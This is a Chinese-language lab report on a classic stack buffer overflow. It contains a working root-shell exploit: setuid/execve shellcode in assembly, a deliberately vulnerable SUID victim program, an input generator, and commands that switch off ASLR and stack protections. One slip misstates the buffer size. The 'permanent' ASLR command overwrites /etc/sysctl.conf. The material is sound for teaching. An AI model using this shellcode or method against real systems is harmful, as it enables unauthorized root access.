# 实验报告
## 实验目的
构造 Shellcode，攻击一个含有缓冲区溢出漏洞的 SUID 程序，打开 root Shell。

## 实验原理
用于演示的含有漏洞的程序段如下：

```c
#include <string.h>

void function(const char *input) {
    char buffer[512];
    strcpy(buffer, input);
}
```

其中 `strcpy` 一行，直接将传入的 `input` 复制到 `buffer` 中，而 `buffer` 的最大长度则为 1024 个字节。构造一个大于 512 字节的输入文件 `input.bin`，即可将数据写到栈上大于 `buffer` 的地址处。

在 `function` 的栈帧上，`buffer` 的高地址之后是保存的上层函数的 `rbp`，占 8 个字节。再之后是返回地址，占 8 个字节。覆写保存的 `rbp` 不会使程序立即崩溃，所以我们可以覆写返回地址来让程序跳转到任意地址。

如果我们构造输入数据，其中包含一段二进制代码，并且将返回地址覆盖为这段二进制代码在内存中的地址（可通过在程序中加入的 `printf` 语句提前获得），即可使被攻击的程序执行任意代码。

## 实验步骤
### 关闭地址随机化
现代操作系统具有一些对缓冲区溢出的防御措施，如将栈地址随机化 —— 每次运行同一个程序时，栈的地址不同，也就无法得知构造的二进制代码被写入到内存中的位置。为了进行实验，我们可以关闭临时（直到重新启动）这一特性：

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

或者永久关闭：

```bash
echo 'kernel.randomize_va_space = 0' | sudo tee /etc/sysctl.conf
sudo sysctl -p
```

### 编译被攻击的程序
将以下代码保存为 `victim.c`：

```c
#include <stdio.h>
#include <string.h>

void function(const char *input) {
    char buffer[512];
    printf("%lu\n", (unsigned long *)buffer); // Get buffer address
    strcpy(buffer, input); // Overflow here
}

int main() {
    FILE *f = fopen("input.bin", "rb");
    if (!f) return 0;

    char buffer[1024];
    fgets(buffer, sizeof(buffer), f);
    function(buffer);

    fputs("failed\n", stderr);
    return 0;
}
```

其中的 `printf` 语句用于在构造输入数据前获得 `buffer` 运行时的地址。

```bash
cc -o victim victim.c -fno-stack-protector -g -z execstack
sudo chown root:root victim
sudo chmod 4755 victim
```

其中 `-fno-stack-protector` 表示关闭编译器对栈溢出的保护，`-z execstack` 使得栈上的二进制代码可被执行。之后的两条命令使得被攻击的程序具有 SUID 权限（可使用 `setuid(0)` 提升至 `root`）。

### 编写 Shellcode
Shellcode，即为一段代码，它被执行后会打开一个 Shell（如 `/bin/sh`）。

通过查阅 Linux 与 libc 相关的源代码与文档，可以得知，在 x86_64 平台下，`setuid` 系统调用的编号为 105、`execve` 系统调用的编号为 59，并且系统调用的编号通过 `rax` 传递，前三个参数通过分别 `rdi`、`rsi`、`rdx` 传递，使用 `syscall` 指令执行系统调用。

为了向 `execve` 传递 Shell 的路径，我们将 `/bin/sh` 这段字符串转换为二进制，以整数的形式写入汇编代码，并将其压入栈中，此时的栈地址即为这段字符串的地址。

需要注意的是，编译出的二进制代码中不能含有 0 字节（否则作为字符串会被截断）。以下的代码中使用了一些技巧，如：将把一个仅有低八位不是 0 的整数赋值给 `rax` 改为赋值给 `al`，以避免汇编后二进制代码中出现 64 位源操作数中的 0；使用 `xor` 代替 `mov` 产生 0 等。

```x86asm
# This shellcode should first elevate the current process to root, then
# write "/bin/sh" (or it's equivalent) to memory, get its address, and
# invoke a "execve" syscall to spawn a shell.

.global shellcode
shellcode:
    # In order to get root privilege, we should call setuid(0) first.
    # According to Linux header's /arch/x86/include/generated/uapi/asm/unistd_64.h,
    # the id of execve syscall is __NR_setuid = 105
    ## movq $105, %rax
    xorq %rax, %rax
    movb $105, %al

    # int setuid (uid_t uid);
    xorq %rdi, %rdi # Pass argument1 with rdi

    # Invoke a setuid syscall
    syscall

    # Now this process is running under root, so we should spawn a shell now.
    # We can use execve syscall to spawn /bin/sh, but first we should put the string
    # '/bin/sh' to memory.
    # The easiest way to put a string to memory is pushing it to the stack.
    # But the following instruction contain a '\0', which can't be passed inside a string.
    # movq $0x0068732f6e69622f, %rax # Reverse of "/bin/sh\0" since it's little endian
    # We can use xor to produce zeros.
    movq $0x2f62696e2f7368ff, %rax # "/bin/sh\xFF"
    xorb %al, %al
    bswap %rax # Reverse byte order since it's little endian
    pushq %rax

    # According to Linux header's /arch/x86/include/generated/uapi/asm/unistd_64.h,
    # the id of execve syscall is __NR_execve = 59
    ## movq $59, %rax
    xorq %rax, %rax
    movb $59, %al

    # int execve (const char *filename, char *const argv [], char *const envp[]);
    movq %rsp, %rdi # Pass argument1 with rdi

    # argv[0] should be filename, and argv[] must end with a NULL, su argv[1] = NULL
    # Construct argv[] also on the stack.
    # The later-pushed value's address is smaller, so push NULL before push filename.
    xorq %rbx, %rbx
    pushq %rbx # pushq $0
    pushq %rdi
    movq %rsp, %rsi # Pass argument2 with rsi

    # envp = NULL
    xorq %rdx, %rdx # Pass argument3 with rdx

    # Invoke a execve syscall
    syscall
```

将 Shellcode 编译（而不链接），并检查二进制文件的反汇编结果：

```bash
cc -c -o shellcode shellcode.s
objdump -d shellcode
```

### 测试 Shellcode
将以下程序编译并与 Shellcode 链接，执行以测试 Shellcode：

```c
int main() {
    extern void shellcode();
    shellcode();
    while (1);
}
```

```bash
cc -o shellcode-test shellcode-test.c shellcode.s
sudo chown root:root shellcode-test
sudo chmod 4755 shellcode-test
./shellcode-test
```

观察到 `#` 提示符，即为成功获得了 root Shell。

### 构造输入
提取出 Shellcode 对应的二进制代码并保存为 `shellcode.bin`：

```bash
objcopy -O binary -j .text shellcode shellcode.bin
```

我们需要构造一个长度为 528 字节的输入，其中前若干个字节为 Shellcode，后 8 个字节为 Shellcode 在内存中的地址，中间的若干个字节可以为任意不为 0 的值。以下为 `input-generator.c`：

```c
#include <stdio.h>
#include <string.h>

const int BUFFER_SIZE = 512;
const char *FILE_SHELLCODE = "shellcode.bin";
const char *FILE_INPUT = "input.bin";

int main() {
    unsigned long buffer_pointer;
    scanf("%lu", &buffer_pointer);

    FILE *f = fopen(FILE_SHELLCODE, "rb");

    char buffer[BUFFER_SIZE + 8 * 2]; // buffer + sfp + ret
    memset(buffer, 0xff, sizeof(buffer)); // sfp will be written with 0xffffffffffffffff

    // Get shellcode size
    fseek(f, 0, SEEK_END);
    int size = ftell(f);
    rewind(f);
    fread(buffer, size, 1, f);

    char *ret = buffer + BUFFER_SIZE + 8; // ret = buffer + sizeof(buffer) + sizeof(sfp)
    *(unsigned long *)ret = buffer_pointer;

    fclose(f);

    f = fopen(FILE_INPUT, "wb");
    fwrite(buffer, sizeof(buffer), 1, f);
    fclose(f);
}
```

执行被攻击的程序，记录其输出的 `buffer` 在内存中的地址，将其输入到 `input-generator` 中，得到的 `input.bin` 即为构造的输入文件。

### 执行攻击
```bash
./victim
```

执行后若观察到 `#` 提示符，即为成功获得了 root Shell。如果程序崩溃，则需要检查 Shellcode、输入数据等是否有误。

## 总结
1. 缓冲区溢出漏洞是 C 程序常见的漏洞 —— 如果不对输入的数据进行足够的检查，则可能将数据写入到栈上缓冲区之外的地址处，严重时可执行任意代码。
2. 现代操作系统对栈溢出攻击有内核级的保护 —— 如栈地址随机化。这项保护让攻击者无法获得有效的栈地址，则无法获得写入的代码在内存中的地址，也就无法构造有效的输入数据执行其构造的代码。
3. 现代编译器会对栈溢出做检查 —— 如果栈中的关键数据遭到篡改，则函数回在返回前终止程序的执行。
4. 现代编译器、操作系统会在默认情况下使栈中的数据不可执行 —— 在这种情况下，即使攻击者成功写入了代码并获得了其地址，也无法将其执行。
5. 在 x86_64 平台下的 Linux 操作系统中，用户态程序通过系统调用与内核交互。实现不同目的的内核调用通过编号来区分，编号通过 `rax` 传递，参数依次通过 `rdi`、`rsi`、`rdx` 等寄存器传递，`syscall` 指令进入系统调用。

## 参考资料
* [Smashing The Stack For Fun And Profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)
* [musl libc](https://www.musl-libc.org/) source code
* Linux kernel headers
